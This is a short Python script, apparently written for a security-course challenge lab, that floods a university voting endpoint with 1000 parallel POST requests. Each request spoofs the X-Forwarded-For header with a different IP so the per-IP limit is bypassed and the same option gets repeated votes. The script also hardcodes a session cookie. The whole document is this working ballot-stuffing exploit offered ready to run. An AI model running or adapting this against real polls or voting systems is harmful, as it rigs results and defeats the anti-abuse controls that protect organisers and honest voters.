import requests
from concurrent.futures import ThreadPoolExecutor

# URL de destino
url = "https://chl-c3c0fa3e-99e0-496b-aef9-cde1ada68a35-votacion-nueva-version.softwareseguro.com.ar/src/ctl/votacion.ctl.php"

# Cabeceras comunes
headers = {
    "Host": "chl-c3c0fa3e-99e0-496b-aef9-cde1ada68a35-votacion-nueva-version.softwareseguro.com.ar",
    "Cookie": "_ga=GA1.3.752036958.1743859339; _gid=GA1.3.151983393.1743859339; PHPSESSID=abffa404a6672e72eac7ef832aa23ace;",
    "Sec-Ch-Ua-Platform": "\"Windows\"",
    "Accept-Language": "es-ES,es;q=0.9",
    "Sec-Ch-Ua": "\"Not:A-Brand\";v=\"24\", \"Chromium\";v=\"134\"",
    "Sec-Ch-Ua-Mobile": "?0",
    "X-Requested-With": "XMLHttpRequest",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Origin": "https://chl-c3c0fa3e-99e0-496b-aef9-cde1ada68a35-votacion-nueva-version.softwareseguro.com.ar",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://chl-c3c0fa3e-99e0-496b-aef9-cde1ada68a35-votacion-nueva-version.softwareseguro.com.ar/",
    "Accept-Encoding": "gzip, deflate, br",
    "Priority": "u=1, i"
}

# Datos del cuerpo de la solicitud
data = {
    "opUniversidad": "1"
}

# Número de iteraciones
num_iteraciones = 1000

# Función para realizar una solicitud
def realizar_peticion(iteracion):
    ip = f"192.168.1.{iteracion+1}"
    headers["X-Forwarded-For"] = ip
    try:
        response = requests.post(url, headers=headers, data=data)
        print(f"Iteración {iteracion+1}: IP {ip} - Código de estado: {response.status_code}")
        if response.status_code == 200:
            print("Respuesta:", response.text)
    except requests.RequestException as e:
        print(f"Error en la iteración {iteracion+1}: {e}")

# Usar ThreadPoolExecutor para realizar solicitudes en paralelo
with ThreadPoolExecutor(max_workers=50) as executor:
    executor.map(realizar_peticion, range(num_iteraciones))